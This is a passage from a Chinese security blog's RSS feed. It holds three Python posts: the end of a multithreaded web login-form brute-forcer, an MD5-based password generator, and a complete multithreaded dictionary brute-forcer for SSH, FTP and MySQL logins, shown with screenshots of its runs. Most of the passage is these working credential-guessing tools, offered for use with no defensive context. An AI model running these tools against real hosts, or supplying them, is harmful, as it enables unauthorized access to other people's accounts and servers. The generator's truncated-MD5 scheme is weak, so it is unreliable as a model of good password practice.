        self.url = options.url
        self.fname = options.fname
        self.fpass = options.fpass
        self.args = args
        self.queue = queue
        self.s = requests.Session()
        self.base_md5 = &#39;&#39;

    def get_payload(self, vname, vpass):
        dict2 = {}
        if self.args:
            for x in self.args:
                (key,value) = x.split(&#39;=&#39;)
                dict2[key] = value
        dict1 = {self.fname: vname, self.fpass: vpass}
        payload = dict(dict1, **dict2)
        return payload

    def get_md5(self, html):
        md5 = hashlib.md5()
        md5.update(html)
        return md5.hexdigest()

    def get_base_md5(self):
        proxy = {
            &#39;http&#39;: &#39;http://127.0.0.1:8080&#39;
        }
        payload = self.get_payload(&#39;1&#39;, &#39;1&#39;)
        resp = self.s.post(self.url, data=payload)
        resp.coding = resp.apparent_encoding
        html = resp.text
        self.base_md5 = self.get_md5(html)

                        
    def run(self):
        # global result
        self.get_base_md5()
        while not self.queue.empty():
            (user,pwd) = self.queue.get().split(&#39;:&#39;)
            payload = self.get_payload(user,pwd)
            try:
                resp = self.s.post(self.url, data=payload, timeout=10)
                resp.coding = resp.apparent_encoding
                code = resp.status_code
                html = resp.text
                curr_md5 = self.get_md5(html)

                if curr_md5 != self.base_md5 and code==200:
                    s = &amp;quot;[Ok] User:%s Pass:%s&amp;quot; % (user,pwd)
                    result.append(s)
                    lock.acquire()
                    print s
                    lock.release()
                    self.queue.task_done()
                else:
                    error = &amp;quot;[Error] User:%s Pass:%s&amp;quot; % (user,pwd)
                    lock.acquire()
                    print error
                    lock.release()
                    self.queue.task_done()
            except requests.exceptions.ConnectTimeout:
                self.queue.put(user+&#39;:&#39;+pwd)
            except:
                pass
        # print self.result


def get_content(filename):
    data = []
    with open(filename) as f:
        lines = f.readlines()
        for line in lines:
            data.append(line.strip())
    return data

def get_queue(list1, list2):
    for user in list1:
        for pwd in list2:
            queue.put(user+&#39;:&#39;+pwd)

def main():
    parser = OptionParser()
    parser.add_option(&#39;-u&#39;,&#39;--url&#39;,dest=&#39;url&#39;,
                        help=&#39;Get target url&#39;)
    parser.add_option(&#39;-n&#39;,&#39;--fname&#39;,dest=&#39;fname&#39;,
                        help=&#39;The user name in the form&#39;)
    parser.add_option(&#39;-p&#39;,&#39;--fpass&#39;,dest=&#39;fpass&#39;,
                        help=&#39;The pass name in the form&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--namefile&#39;,dest=&#39;namefile&#39;,default=&#39;namefile.txt&#39;,
                        help=&#39;The user name dictionary files&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;passfile.txt&#39;,
                        help=&#39;The password dictionary files&#39;)
    (options,args) = parser.parse_args()

    if options.url and options.fname and options.fpass and options.namefile and options.passfile:
        users = []
        pwds = []
        users = get_content(options.namefile)
        pwds = get_content(options.passfile)
        get_queue(users, pwds)

        for x in xrange(1,41):
            blast = FormBlast(options, args, queue)
            blast.setDaemon(True)
            blast.start()
        queue.join()

        sleep(3)
        print &amp;quot;########################################&amp;quot;
        for x in result:
            print x
    else:
        parser.print_help()


if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;结果:ce6886490f9a6e6169f210150773b52d&#34;&gt;结果&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast1.png&#34; alt=&#34;表单爆破1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast2.png&#34; alt=&#34;表单爆破2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现密码生成器</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</link>
      <pubDate>Mon, 29 Aug 2016 15:14:57 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</guid>
      <description>

&lt;h2 id=&#34;简介:c1145265751ca3eb267d557c37d78b56&#34;&gt;简介&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则可能会忘记，在这里就用脚本写一个生成密码的工具，只需输入域名和账户名就可以根据key生成不一样的密码，也可以把域名和账户名写入文件，这样你用户名也可以不用记了。。。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;代码如下:c1145265751ca3eb267d557c37d78b56&#34;&gt;代码如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import hashlib
import sys
import os
import optparse
import json
import msvcrt

def get_md5(string):
    md5 = hashlib.md5()
    md5.update(string)
    s = md5.hexdigest()
    return s

def get_domain():
    if os.path.exists(&#39;account.txt&#39;):
        data = {}
        with open(&#39;account.txt&#39;, &#39;r&#39;) as f:
            lines = f.readlines()
            for line in lines:
                line = line.split(&#39;*&#39;)
                data[line[0]] = line[1].strip()
    else:
        pass
    return data

def get_pass():
    pwd = []
    while True:
        nchar = msvcrt.getch()
        if nchar in &#39;\r\n&#39;:
            print &#39;&#39;
            break
        elif nchar == &#39;\b&#39;: #&#39;\b&#39;是退格
            if pwd:
                del pwd[-1]
                sys.stdout.write(&#39;\b \b&#39;) #光标退格，输出一个空格，再退格
        else:
            pwd.append(nchar)
            sys.stdout.write(&#39;*&#39;)
    pwd = &#39;&#39;.join(pwd)
    return pwd

def main():
    if os.path.exists(&#39;account.txt&#39;):
        data = get_domain()
        parser = optparse.OptionParser()
        parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
                            default=None, type=&#39;string&#39;,
                            help=&#39;domain&#39;)
        parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;List&#39;,
                            default=False, action=&#39;store_true&#39;,
                            help=&#39;show all domain and username&#39;)

        (options, args) = parser.parse_args()

        if options.url:
            domain = options.url
            ID = data[domain]
            print &amp;quot;Please input key: &amp;quot;,
            key = get_pass()

            mdomain = get_md5(domain)[0:8]
            mid = get_md5(ID)[8:24]
            mkey = get_md5(key)[16:32]
            pwd = mdomain + mid + mkey
            mpwd = get_md5(pwd)[8:24]
            print &amp;quot;\nDomain: %s\nName: %s\nPass: %s&amp;quot; % (domain,ID,mpwd)
        elif options.List:
            print json.dumps(data, indent=4)
        else:
            parser.print_help()
    else:
        if len(sys.argv) != 3:
            print &amp;quot;Usage: python account.py domain ID&amp;quot;
        else:
            domain = sys.argv[1]
            ID = sys.argv[2]
            print &amp;quot;Please input key: &amp;quot;,
            key = get_pass()

            mdomain = get_md5(domain)[0:8]
            mid = get_md5(ID)[8:24]
            mkey = get_md5(key)[16:32]
            pwd = mdomain + mid + mkey
            mpwd = get_md5(pwd)[8:24]
            print &amp;quot;\nDomain: %s\nName: %s\nPass: %s&amp;quot; % (domain,ID,mpwd)

main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;运行结果:c1145265751ca3eb267d557c37d78b56&#34;&gt;运行结果&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;可在脚本同文件夹下新建txt文件，内容形式如：baidu.com*wyb_9，站点域名和用户名以*分割

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/create_pwd_has_file.png&#34; alt=&#34;存在文件.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/create_pwd_no_file.png&#34; alt=&#34;不存在文件.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;脚本:584a532418a1844143552a4b9dd71035&#34;&gt;脚本&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

&#39;this script can bruter ftp/ssh/mysql&#39;

__author__ = &#39;reber&#39;

import Queue
import threading
import time
import logging
import socket
from optparse import OptionParser
import paramiko
from ftplib import FTP
import MySQLdb

#################公有类#################
class CommonFun(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(CommonFun, self).__init__()

    def set_log(self,lname):
        logger = logging.getLogger(lname)
        logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;)
        ch.setFormatter(formatter)

        logger.addHandler(ch)

    def show_log(self, lname, msg):
        a = logging.getLogger(lname)
        a.debug(msg)

    def show_result(self, lname, rlist):
        if rlist:
            print &amp;quot;###################################################################&amp;quot;
            for x in rlist:
                self.show_log(lname,x)
        else:
            print &amp;quot;not found...&amp;quot;

#################SSH爆破模块#################
class SshBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for SshBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(SshBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        self.is_exit = False
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):        
        while not self.qlist.empty():
            if not self.is_exit:
                name,pwd = self.qlist.get().split(&#39;:&#39;)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                    self.qlist.put(name + &#39;:&#39; + pwd)
                    time.sleep(3)
                except Exception, e:
                    error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################FTP爆破模块#################
class FtpBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for FtpBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(FtpBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                ftp = FTP()
                ftp.connect(self.host, 21, self.timeout)
                ftp.login(name, pwd)
                time.sleep(0.05)
                ftp.quit()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(1)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################MySQL爆破模块#################
class MysqlBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for MysqlBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(MysqlBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db=&#39;mysql&#39;, port=3306)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(3)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

def main():
    parser = OptionParser(usage=&#39;Usage: python %prog [options] type&#39;)
    parser.add_option(&#39;-i&#39;,&#39;--host&#39;,dest=&#39;host&#39;,help=&#39;target ip&#39;)
    parser.add_option(&#39;-o&#39;,&#39;--timeout&#39;,type=int,dest=&#39;timeout&#39;,default=5,help=&#39;timeout&#39;)
    parser.add_option(&#39;-t&#39;,&#39;--thread&#39;,type=int,dest=&#39;threadnum&#39;,default=10,help=&#39;threadnum&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--userfile&#39;,dest=&#39;userfile&#39;,default=&#39;username.txt&#39;,help=&#39;userfile&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;password.txt&#39;,help=&#39;passfile&#39;)

    (options, args) = parser.parse_args()

    if not args:
        parser.print_help()
        exit()

    if args[0]==&#39;ssh&#39;:
        if options.host:
            ssh = SshBruter(options, args)
            ssh.run()
        else:
            parser.print_help()
    elif args[0]==&#39;ftp&#39;:
        if options.host:
            ftp = FtpBruter(options, args)
            ftp.run()
        else:
            parser.print_help()
    elif args[0]==&#39;mysql&#39;:
        if options.host:
            mysql = MysqlBruter(options, args)
            mysql.run()
        else:
            parser.print_help()
    else:
        print &amp;quot;type must be ssh or ftp or mysql&amp;quot;

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;尝试爆破:584a532418a1844143552a4b9dd71035&#34;&gt;尝试爆破&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_help.png&#34; alt=&#34;帮助信息.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ssh.png&#34; alt=&#34;爆破SSH.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ftp.png&#34; alt=&#34;爆破FTP.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_mysql.png&#34; alt=&#34;爆破MySQL.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>